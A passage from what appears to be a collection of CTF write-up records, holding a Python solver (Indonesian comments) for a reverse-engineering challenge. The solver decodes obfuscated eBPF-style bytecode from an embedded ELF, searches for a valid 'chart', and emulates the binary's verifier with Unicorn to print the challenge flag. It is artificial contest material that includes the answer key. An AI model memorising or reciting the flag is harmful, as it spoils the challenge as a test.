ditemukan\")\r\n\r\n    elf = exe_data[elf_off:]\r\n    if elf[4] != 2 or elf[5] != 1:\r\n        raise ValueError(\"Format ELF bukan ELF64 little-endian\")\r\n\r\n    e_shoff = struct.unpack_from(\"<Q\", elf, 0x28)[0]\r\n    e_shentsize = struct.unpack_from(\"<H\", elf, 0x3A)[0]\r\n    e_shnum = struct.unpack_from(\"<H\", elf, 0x3C)[0]\r\n    e_shstrndx = struct.unpack_from(\"<H\", elf, 0x3E)[0]\r\n\r\n    def section_header(index: int) -> tuple[int, int, int]:\r\n        off = e_shoff + index * e_shentsize\r\n        sh_name = struct.unpack_from(\"<I\", elf, off)[0]\r\n        sh_offset = struct.unpack_from(\"<Q\", elf, off + 0x18)[0]\r\n        sh_size = struct.unpack_from(\"<Q\", elf, off + 0x20)[0]\r\n        return sh_name, sh_offset, sh_size\r\n\r\n    _, shstr_off, shstr_size = section_header(e_shstrndx)\r\n    shstr = elf[shstr_off : shstr_off + shstr_size]\r\n\r\n    for index in range(e_shnum):\r\n        name_off, sec_off, sec_size = section_header(index)\r\n        end = shstr.find(b\"\\0\", name_off)\r\n        name = shstr[name_off:end]\r\n        if name == b\".rodata\":\r\n            return elf[sec_off : sec_off + sec_size]\r\n\r\n    raise ValueError(\"Section .rodata tidak ditemukan\")\r\n\r\n\r\ndef unpack_program(rodata: bytes) -> bytes:\r\n    \"\"\"Buka container custom: magic[14], type, skip, uint16 length, payload.\"\"\"\r\n    if len(rodata) < 18 or rodata[14] != 2:\r\n        raise ValueError(\"Header container .rodata tidak cocok\")\r\n\r\n    skip = rodata[15]\r\n    payload_len = struct.unpack_from(\"<H\", rodata, 16)[0]\r\n    payload_off = 18 + skip\r\n    payload = rodata[payload_off : payload_off + payload_len]\r\n    if len(payload) != payload_len:\r\n        raise ValueError(\"Payload eBPF terpotong\")\r\n    return payload\r\n\r\n\r\ndef decode_program(payload: bytes) -> list[tuple[int, int, int, int]]:\r\n    ops: list[tuple[int, int, int, int]] = []\r\n    for offset in range(0, len(payload) - 3, 4):\r\n        raw = payload[offset : offset + 4]\r\n        op = raw[0] ^ ((offset * 0x11 + 0xA3) & 0xFF)\r\n        a = raw[1] ^ ((offset * 0x1D + 0x11) & 0xFF)\r\n        b = raw[2] ^ ((offset * 0x1F + 0x7B) & 0xFF)\r\n        c = raw[3] ^ ((offset * 0x25 + 0xC5) & 0xFF)\r\n        ops.append((op, a, b, c))\r\n        if op == 0xF0:\r\n            break\r\n    if not ops or ops[-1][0] != 0xF0:\r\n        raise ValueError(\"Opcode terminator 0xf0 tidak ditemukan\")\r\n    return ops\r\n\r\n\r\ndef recover_chart(ops: Iterable[tuple[int, int, int, int]]) -> bytes:\r\n    ops = list(ops)\r\n    state = 0x31C3F00D\r\n\r\n    # Dua belas opcode pertama mengikat 8-byte seed dan panjang chart (40).\r\n    prefix = ops[:12]\r\n    if len(prefix) != 12 or any(op != 0x21 for op, _, _, _ in prefix):\r\n        raise ValueError(\"Prefix opcode 0x21 tidak sesuai\")\r\n\r\n    context = bytearray(12)\r\n    for op, a, b, c in prefix:\r\n        if a >= len(context):\r\n            raise ValueError(\"Indeks context di luar batas\")\r\n        context[a] = b\r\n        state = ((((state + b) & 0xFFFFFFFF) ^ c) * 33 + a) & 0xFFFFFFFF\r\n\r\n    if struct.unpack_from(\"<I\", context, 8)[0] != 40:\r\n        raise ValueError(\"Panjang chart pada context bukan 40\")\r\n\r\n    note_ops = ops[12:32]\r\n    if len(note_ops) != 20 or any(op != 0x44 for op, _, _, _ in note_ops):\r\n        raise ValueError(\"Blok opcode 0x44 tidak lengkap\")\r\n\r\n    solutions: list[bytes] = []\r\n    chart: list[tuple[int, int] | None] = [None] * 20\r\n\r\n    def dfs(pos: int, current_state: int) -> None:\r\n        if len(solutions) > 1:\r\n            return\r\n        if pos == len(note_ops):\r\n            packed = bytes(v for note in chart for v in note)  # type: ignore[arg-type]\r\n            if summarize_chart(packed) == TARGET_SUMMARY:\r\n                solutions.append(packed)\r\n            return\r\n\r\n        _, note_index, expected_fold, expected_low = note_ops[pos]\r\n        if note_index >= 20 or chart[note_index] is not None:\r\n            return\r\n\r\n        for lane in range(5):\r\n            for kind in range(3):\r\n                for flick in range(2):\r\n                    parity = (lane - note_index) & 1\r\n                    packed_note = lane | (kind << 3) | (flick << 5) | (parity << 6)\r\n                    for delta in range(3, 17):\r\n                        mixed = (\r\n                            packed_note * 17\r\n                            + delta * 31\r\n                            + current_state\r\n                            + note_index * 73\r\n                        ) & 0xFFFF\r\n                        folded = ((mixed >> 8) ^ mixed) & 0xFF\r\n                        if folded != expected_fold:\r\n                            continue\r\n\r\n                        next_state = (\r\n                            (current_state ^ mixed)\r\n                            + ((packed_note << 8) | delta)\r\n                            + expected_fold\r\n                        ) & 0xFFFFFFFF\r\n                        next_state = rol32(next_state, (note_index & 7) + 1)\r\n                        if (next_state & 0xFF) != expected_low:\r\n                            continue\r\n\r\n                        chart[note_index] = (packed_note, delta)\r\n                        dfs(pos + 1, next_state)\r\n                        chart[note_index] = None\r\n\r\n    dfs(0, state)\r\n    if len(solutions) != 1:\r\n        raise ValueError(f\"Chart valid tidak unik: {len(solutions)} solusi\")\r\n    return solutions[0]\r\n\r\n\r\ndef summarize_chart(chart: bytes) -> tuple[int, int, int, int, list[int], list[int]]:\r\n    if len(chart) != 40:\r\n        raise ValueError(\"Chart harus tepat 40 byte\")\r\n\r\n    s0 = 0x6D697275\r\n    s1 = 0x6E656E65\r\n    s2 = 0x6B616E61\r\n    bitset = 0\r\n    previous = 0\r\n    lane_sum = [0] * 5\r\n    kind_sum = [0] * 3\r\n\r\n    for index in range(20):\r\n        packed_note = chart[index * 2]\r\n        delta = chart[index * 2 + 1]\r\n        lane = packed_note & 7\r\n        kind = (packed_note >> 3) & 3\r\n        flick = (packed_note >> 5) & 1\r\n        parity = (packed_note >> 6) & 1\r\n\r\n        if lane > 4 or kind > 2 or not 3 <= delta <= 16:\r\n            raise ValueError(\"Field note di luar rentang\")\r\n        if parity != ((lane - index) & 1):\r\n            raise ValueError(\"Parity note salah\")\r\n\r\n        value = delta * 120 + previous + ((index ^ lane) & 3)\r\n        s0 = rol32(\r\n            (\r\n                s0\r\n                + delta * 0x119DE1F3\r\n                + (lane + 1) * 0x045D9F3B\r\n                + index\r\n            )\r\n            & 0xFFFFFFFF,\r\n            (kind + 1) * 3 + flick,\r\n        )\r\n\r\n        packed = ((((delta << 8) | packed_note) << 16) | (value & 0xFFFF))\r\n        s1 ^= rol32(packed & 0xFFFFFFFF, lane + index)\r\n        s2 = (s2 + (s1 ^ s0) + (kind + 17) * (flick + 3)) & 0xFFFFFFFF\r\n\r\n        position = (5 * lane + kind + value // 120) % 25\r\n        bitset |= 1 << position\r\n        lane_sum[lane] += 5 * flick + 3 * kind + parity + delta\r\n        kind_sum[kind] += (index & 3) + lane + delta\r\n        previous = value\r\n\r\n    return s0, s1, s2, bitset, lane_sum, kind_sum\r\n\r\n\r\ndef emulate_verifier(exe_path: Path, chart: bytes) -> bytes:\r\n    \"\"\"Jalankan fungsi check_chart asli dengan Unicorn dan stub CRT minimum.\"\"\"\r\n    pe = pefile.PE(str(exe_path))\r\n    base = pe.OPTIONAL_HEADER.ImageBase\r\n    image = pe.get_memory_mapped_image()\r\n    image_size = (len(image) + 0xFFF) & ~0xFFF\r\n\r\n    uc = Uc(UC_ARCH_X86, UC_MODE_64)\r\n    uc.mem_map(base, image_size)\r\n    uc.mem_write(base, image)\r\n\r\n    heap_base, heap_size = 0x20000000, 0x02000000\r\n    stack_base, stack_size = 0x30000000, 0x00400000\r\n    object_base = 0x40000000\r\n    uc.mem_map(heap_base, heap_size)\r\n    uc.mem_map(stack_base, stack_size)\r\n    uc.mem_map(object_base, 0x10000)\r\n\r\n    heap_ptr = heap_base + 0x1000\r\n    sentinel = base + 0x100\r\n    chart_data = object_base + 0x1000\r\n    chart_vector = object_base + 0x100\r\n    output_vector = object_base + 0x200\r\n\r\n    uc.mem_write(chart_data, chart)\r\n    uc.mem_write(\r\n        chart_vector,\r\n        struct.pack(\"<QQQ\", chart_data, chart_data + len(chart), chart_data + len(chart)),\r\n    )\r\n    uc.mem_write(output_vector, b\"\\0\" * 0x100)\r\n\r\n    hooks = {\r\n        base + RVA_MALLOC: \"malloc\",\r\n        base + RVA_FREE: \"free\",\r\n        base + RVA_MEMCPY: \"memcpy\",\r\n        base + RVA_MEMMOVE: \"memmove\",\r\n        base + RVA_MEMSET: \"memset\",\r\n        base + RVA_MEMCMP: \"memcmp\",\r\n        base + RVA_STRLEN: \"strlen\",\r\n    }\r\n    failure: list[str] = []\r\n\r\n    def reg(register: int) -> int:\r\n        return uc.reg_read(register)\r\n\r\n    def function_return(value: int | None = None) -> None:\r\n        rsp = reg(UC_X86_REG_RSP)\r\n        return_address = struct.unpack(\"<Q\", uc.mem_read(rsp, 8))[0]\r\n        if value is not None:\r\n            uc.reg_write(UC_X86_REG_RAX, value & 0xFFFFFFFFFFFFFFFF)\r\n        uc.reg_write(UC_X86_REG_RSP, rsp + 8)\r\n        uc.reg_write(UC_X86_REG_RIP, return_address)\r\n\r\n    def code_hook(machine: Uc, address: int, size: int, user_data: object) -> None:\r\n        nonlocal heap_ptr\r\n        if address == sentinel:\r\n            machine.emu_stop()\r\n            return\r\n        if address == base + RVA_THROW:\r\n            failure.append(\"Verifier melempar exception\")\r\n            machine.emu_stop()\r\n            return\r\n\r\n        name = hooks.get(address)\r\n        if name is None:\r\n            return\r\n\r\n        if name == \"malloc\":\r\n            requested = reg(UC_X86_REG_RCX)\r\n            allocation_size = max((requested + 15) & ~15, 16)\r\n            result = heap_ptr\r\n            heap_ptr += allocation_size\r\n            if heap_ptr >= heap_base + heap_size:\r\n                failure.append(\"Heap emulasi habis\")\r\n                machine.emu_stop()\r\n                return\r\n            machine.mem_write(result, b\"\\0\" * allocation_size)\r\n            function_return(result)\r\n        elif name == \"free\":\r\n            function_return(0)\r\n        elif name in (\"memcpy\", \"memmove\"):\r\n            destination = reg(UC_X86_REG_RCX)\r\n            source = reg(UC_X86_REG_RDX)\r\n            length = reg(UC_X86_REG_R8)\r\n            if length:\r\n                machine.mem_write(destination, bytes(machine.mem_read(source, length)))\r\n            function_return(destination)\r\n        elif name == \"memset\":\r\n            destination = reg(UC_X86_REG_RCX)\r\n            value = reg(UC_X86_REG_RDX) & 0xFF\r\n            length = reg(UC_X86_REG_R8)\r\n            if length:\r\n                machine.mem_write(destination, bytes([value]) * length)\r\n            function_return(destination)\r\n        elif name == \"memcmp\":\r\n            left = bytes(machine.mem_read(reg(UC_X86_REG_RCX), reg(UC_X86_REG_R8)))\r\n            right = bytes(machine.mem_read(reg(UC_X86_REG_RDX), reg(UC_X86_REG_R8)))\r\n            result = (left > right) - (left < right)\r\n            function_return(result & 0xFFFFFFFF)\r\n        elif name == \"strlen\":\r\n            pointer = reg(UC_X86_REG_RCX)\r\n            length = 0\r\n            while machine.mem_read(pointer + length, 1)[0] != 0:\r\n                length += 1\r\n            function_return(length)\r\n\r\n    def invalid_memory_hook(\r\n        machine: Uc,\r\n        access: int,\r\n        address: int,\r\n        size: int,\r\n        value: int,\r\n        user_data: object,\r\n    ) -> bool:\r\n        failure.append(\r\n            f\"Akses memori invalid di 0x{address:x}, RIP=0x{reg(UC_X86_REG_RIP):x}\"\r\n        )\r\n        return False\r\n\r\n    uc.hook_add(UC_HOOK_CODE, code_hook)\r\n    uc.hook_add(UC_HOOK_MEM_INVALID, invalid_memory_hook)\r\n\r\n    rsp = (stack_base + stack_size - 0x1000) & ~0xF\r\n    rsp -= 8\r\n    uc.mem_write(rsp, struct.pack(\"<Q\", sentinel))\r\n    uc.reg_write(UC_X86_REG_RSP, rsp)\r\n    uc.reg_write(UC_X86_REG_RCX, output_vector)\r\n    uc.reg_write(UC_X86_REG_RDX, chart_vector)\r\n\r\n    try:\r\n        uc.emu_start(base + RVA_CHECK_CHART, sentinel, count=100_000_000)\r\n    except UcError as exc:\r\n        details = failure[-1] if failure else str(exc)\r\n        raise RuntimeError(f\"Emulasi verifier gagal: {details}\") from exc\r\n\r\n    if failure:\r\n        raise RuntimeError(failure[-1])\r\n\r\n    begin, end, capacity = struct.unpack(\"<QQQ\", uc.mem_read(output_vector, 24))\r\n    if not (begin <= end <= capacity) or end - begin > 0x1000:\r\n        raise RuntimeError(\"Objek output verifier tidak valid\")\r\n    return bytes(uc.mem_read(begin, end - begin))\r\n\r\n\r\ndef main() -> None:\r\n    if not EXE.is_file():\r\n        raise SystemExit(f\"File tidak ditemukan: {EXE}\")\r\n\r\n    exe_data = EXE.read_bytes()\r\n    rodata = extract_elf_rodata(exe_data)\r\n    payload = unpack_program(rodata)\r\n    ops = decode_program(payload)\r\n    chart = recover_chart(ops)\r\n    flag = emulate_verifier(EXE, chart)\r\n\r\n    try:\r\n        flag_text = flag.decode(\"ascii\")\r\n    except UnicodeDecodeError as exc:\r\n        raise SystemExit(f\"Output verifier bukan ASCII: {flag.hex()}\") from exc\r\n\r\n    print(f\"chart = {chart.hex()}\")\r\n    print(f\"flag  = {flag_text}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "SEKAI{eBPF_my_B3l0v3d}",
    "lessonsLearned": ""
  }
];
